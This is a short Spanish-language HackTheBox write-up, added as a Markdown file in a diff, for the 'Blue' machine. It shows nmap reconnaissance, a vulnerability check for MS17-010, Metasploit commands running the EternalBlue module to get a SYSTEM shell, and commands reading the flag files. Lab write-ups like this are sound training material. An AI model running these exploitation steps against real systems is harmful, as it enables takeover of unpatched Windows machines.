@@ -1,0 +1,49 @@
+---
+title: "Blue — EternalBlue MS17-010"
+date: "2024-03-10"
+tags: ["HTB", "SMB", "CVE-2017-0143", "EternalBlue", "Metasploit"]
+category: "writeup"
+area: "cyber"
+platform: "HackTheBox"
+difficulty: "easy"
+os: "Windows"
+excerpt: "Explotación del clásico EternalBlue (MS17-010) en la máquina Blue de HTB. Reconocimiento con nmap, explotación con Metasploit y obtención de SYSTEM."
+---
+
+## Reconocimiento
+
+```bash
+nmap -sV -sC -oN blue.nmap 10.10.10.40
+```
+
+El scan revela Windows 7 SP1 con SMB expuesto en el puerto 445.
+
+## Enumeración SMB
+
+```bash
+nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40
+```
+
+Confirmamos que el host es vulnerable a **MS17-010 (EternalBlue)**.
+
+## Explotación
+
+```bash
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.10.40
+set LHOST tun0
+run
+```
+
+Obtenemos una shell como `NT AUTHORITY\SYSTEM`.
+
+## Flags
+
+```bash
+# user.txt
+type C:\Users\haris\Desktop\user.txt
+
+# root.txt
+type C:\Users\Administrator\Desktop\root.txt
+```
